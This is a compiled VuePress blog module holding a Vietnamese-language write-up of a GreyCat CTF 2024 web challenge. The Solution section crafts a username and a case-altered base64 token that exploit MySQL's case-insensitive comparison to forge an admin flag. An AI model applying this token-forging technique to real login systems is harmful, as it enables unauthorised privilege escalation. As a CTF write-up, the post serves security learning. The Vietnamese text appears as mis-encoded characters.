import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, e as createBaseVNode, a as createStaticVNode, f as createTextVNode, b as createVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _imports_0 = "/assets/greycatctf-2024-BJuFYRpG.png";
const _imports_1 = "/assets/greycatctf-2024-1-BN8Rh6MX.png";
const _imports_2 = "/assets/greycatctf-2024-2-CF9z7uD8.png";
const _imports_3 = "/assets/greycatctf-2024-3-CZji1Ln4.png";
const _sfc_main = {};
const _hoisted_1 = { class: "custom-container info" };
const _hoisted_2 = {
  href: "https://github.com/NUSGreyhats/greyctf24-challs-public/tree/main/quals/web/no-sql-injection/distribution",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[6] || (_cache[6] = createBaseVNode("h2", {
      id: "overview",
      tabindex: "-1"
    }, [
      createBaseVNode("a", {
        class: "header-anchor",
        href: "#overview"
      }, [
        createBaseVNode("span", null, "Overview")
      ])
    ], -1)),
    createBaseVNode("div", _hoisted_1, [
      _cache[5] || (_cache[5] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>I asked My friend Jason to build me a new e-commerce website. We just finished the login system and there&#39;s already bugs ğŸ¤¦</p>', 3)),
      createBaseVNode("p", null, [
        _cache[1] || (_cache[1] = createTextVNode("Author: jro")),
        _cache[2] || (_cache[2] = createBaseVNode("br", null, null, -1)),
        createBaseVNode("a", _hoisted_2, [
          _cache[0] || (_cache[0] = createBaseVNode("code", null, "ğŸ“ no-sql-injection.zip", -1)),
          createVNode(_component_ExternalLinkIcon)
        ]),
        _cache[3] || (_cache[3] = createBaseVNode("br", null, null, -1)),
        _cache[4] || (_cache[4] = createBaseVNode("a", { href: "/tags/SQLi/1" }, [
          createBaseVNode("code", null, "ğŸ”– SQL Injection")
        ], -1))
      ])
    ]),
    _cache[7] || (_cache[7] = createStaticVNode('<p><img src="' + _imports_0 + '" alt="image"></p><ul><li>Web cÃ³ hai chá»©c nÄƒng cÆ¡ báº£n lÃ  Register lÃ  Login</li><li>Data nháº­p vÃ o sáº½ Ä‘Æ°á»£c convert vÃ  lÆ°u dÆ°á»›i dáº¡ng base64</li><li>Register pháº£i qua hai láº§n xá»­ lÃ½ lÃ  <code>register/1</code> Ä‘á»ƒ lÆ°u token vÃ  <code>register/2</code> Ä‘á»ƒ lÆ°u username tá»« token vÃ  password. Máº·c Ä‘á»‹nh sáº½ lÃ  <code>&quot;admin&quot;: false</code></li><li>Khi login, web sáº½ check náº¿u username tÆ°Æ¡ng á»©ng lÃ  admin thÃ¬ tráº£ vá» flag.</li></ul><p>Giáº£ sá»­ khi register vá»›i username lÃ  <code>doxbi</code>, username sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o JSON vÃ  encode sang base64, sau Ä‘Ã³ lÆ°u vÃ o table <code>tokens</code></p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/register/1&#39;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token operator">...</span></span>\n<span class="line">  <span class="token keyword">const</span> token <span class="token operator">=</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span></span>\n<span class="line">    <span class="token literal-property property">name</span><span class="token operator">:</span> username<span class="token punctuation">,</span></span>\n<span class="line">    <span class="token literal-property property">admin</span><span class="token operator">:</span> <span class="token boolean">false</span></span>\n<span class="line">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">await</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">&quot;insert into tokens values (?)&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string-property property">&quot;err&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string-property property">&quot;token&quot;</span><span class="token operator">:</span> token <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token operator">...</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Sau Ä‘Ã³ ta cáº§n nháº­p password vÃ  token Ä‘Æ°á»£c tráº£ vá» á»Ÿ bÆ°á»›c Ä‘áº§u Ä‘á»ƒ POST lÃªn <code>/api/register/2</code> Ä‘á»ƒ lÆ°u username vÃ  password</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/register/2&#39;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token operator">...</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">&quot;select 1 from tokens where token = ?&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">err</span><span class="token operator">:</span> <span class="token string">&quot;Token not found!&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token operator">...</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token keyword">const</span> <span class="token punctuation">{</span> name<span class="token punctuation">,</span> admin <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">await</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">&quot;insert into users (name, password, admin) values (?, ?, ?)&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>name<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span> admin <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string-property property">&quot;err&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="idea" tabindex="-1"><a class="header-anchor" href="#idea"><span>Idea</span></a></h2><p>á» Ä‘Ã¢y, code sáº½ check token cÃ³ tá»“n táº¡i trong database khÃ´ng vÃ  láº¥y username, admin tá»« token Ä‘á»ƒ lÆ°u vÃ o table <code>users</code>. Vá»›i bÃ i nÃ y, ta cáº§n pháº£i tÃ¬m cÃ¡ch thay Ä‘á»•i admin cá»§a token thÃ nh true Ä‘á»ƒ láº¥y Ä‘Æ°á»£c flag khi login. Äiá»ƒm Ä‘áº·c biá»‡t cá»§a bÃ i nÃ y lÃ  lÆ°u trá»¯ dá»¯ liá»‡u trong database dÆ°á»›i dáº¡ng base64. Tuy nhiÃªn khi so sÃ¡nh báº±ng thÃ¬ MySQL láº¡i khÃ´ng phÃ¢n biá»‡t hoa thÆ°á»ng, tá»©c lÃ  <code>&#39;a&#39; = &#39;A&#39;</code>. MÃ  base64 láº¡i khÃ´ng nhÆ° tháº¿, decode <code>AAAA</code> vÃ  <code>aaaa</code> sáº½ cho ra hai káº¿t quáº£ khÃ¡c nhau. Ta cÃ³ thá»ƒ táº­n dá»¥ng viá»‡c nÃ y Ä‘á»ƒ bypass viá»‡c check token tá»« database vÃ  thay Ä‘á»•i admin thÃ nh true.</p><h2 id="solution" tabindex="-1"><a class="header-anchor" href="#solution"><span>Solution</span></a></h2><p>ÄÄƒng kÃ½ vá»›i username lÃ  <code>doxbi</code>, ta sáº½ Ä‘Æ°á»£c token nhÆ° sau</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;doxbi&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;admin&quot;</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>Ta cáº§n inject vÃ o username Ä‘á»ƒ cÃ³ thá»ƒ set admin thÃ nh true</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;doxbi&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;admin&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">&quot;a&quot;</span><span class="token operator">:</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;admin&quot;</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">eyJuYW1lIjoiZG94YmkiLCJhZG1pbiI6dHJ1ZSwiYSI6ImIiLCJhZG1pbiI6ZmFsc2V9</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>MÃ¬nh sáº½ thay Ä‘á»•i má»™t sá»‘ kÃ½ tá»± hoa &lt;-&gt; thÆ°á»ng, thay tháº¿ dáº¥u nhÃ¡y vá»›i kÃ­ tá»± khÃ¡c Ä‘á»ƒ inject vÃ o username</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;doxbbÂ¢-Ã‚admin(Âºtrue%Â¢bÃ‚: Ã‚&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;admin&quot;</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">eyJuYW1lIjoiZG94YmKiLcJhZG1pbii6dHJ1ZSWiYsI6IMIiLCJhZG1pbiI6ZmFsc2V9</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Tá»›i Ä‘Ã¢y váº«n cÃ²n váº¥n Ä‘á» nhá» vá»›i key <code>admin</code> á»Ÿ cuá»‘i, nÃ³ sáº½ ghi Ä‘Ã¨ lÃªn key <code>admin</code> ta thÃªm vÃ o, ta chá»‰ cáº§n thay Ä‘á»•i key vá»›i cÃ¡ch tÆ°Æ¡ng tá»± nhÆ° trÃªn</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json" data-title="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token string">&quot;doxbbÂ¢-Ã‚admin(Âºtrue%Â¢bÃ‚: Ã‚&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;Gdmin&quot;</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">eyJuYW1lIjoiZG94YmKiLcJhZG1pbii6dHJ1ZSWiYsI6IMIiLCJHZG1pbiI6ZmFsc2V9</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Cá»¥ thá»ƒ, mÃ¬nh cáº§n pháº£i Ä‘Äƒng kÃ½ vá»›i username lÃ  <code>doxbbÂ¢-Ã‚admin(Âºtrue%Â¢bÃ‚: Ã‚</code>. Token <code>eyJuYW1lIjoiZG94YmKiLcJhZG1pbii6dHJ1ZSWiYsI6IMIiLCJhZG1pbiI6ZmFsc2V9</code> sáº½ Ä‘Æ°á»£c lÆ°u vÃ o trong table. <img src="' + _imports_1 + '" alt="image"> Sau khi token Ä‘Æ°á»£c lÆ°u vÃ o database, ta POST lÃªn <code>/register/2</code> vá»›i token Ä‘Ã£ Ä‘Æ°á»£c chá»‰nh sá»­a Ä‘á»ƒ set admin thÃ nh true. <img src="' + _imports_2 + '" alt="image"> Khi MySQL compare váº«n sáº½ tráº£ vá» 1, nhÆ°ng khi decode base64 sáº½ ra name=doxbi, admin=true vÃ  lÆ°u vÃ o table. Giá» chá»‰ cáº§n login vá»›i username lÃ  <code>doxbi</code> vÃ  password Ä‘á»ƒ láº¥y flag <img src="' + _imports_3 + '" alt="image"></p>', 18))
  ]);
}
const greycatctf2024_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "greycatctf-2024.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2024/greycatctf-2024.html","title":"Base64 and SQL Injection","lang":"en-US","frontmatter":{"title":"Base64 and SQL Injection","description":"From Grey Cat CTF 2024","date":"2024-04-21T00:00:00.000Z","tags":["SQLi"],"categories":["CTF"]},"headers":[{"level":2,"title":"Overview","slug":"overview","link":"#overview","children":[]},{"level":2,"title":"Idea","slug":"idea","link":"#idea","children":[]},{"level":2,"title":"Solution","slug":"solution","link":"#solution","children":[]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2024/greycatctf-2024.md"}');
export {
  greycatctf2024_html as comp,
  data
};
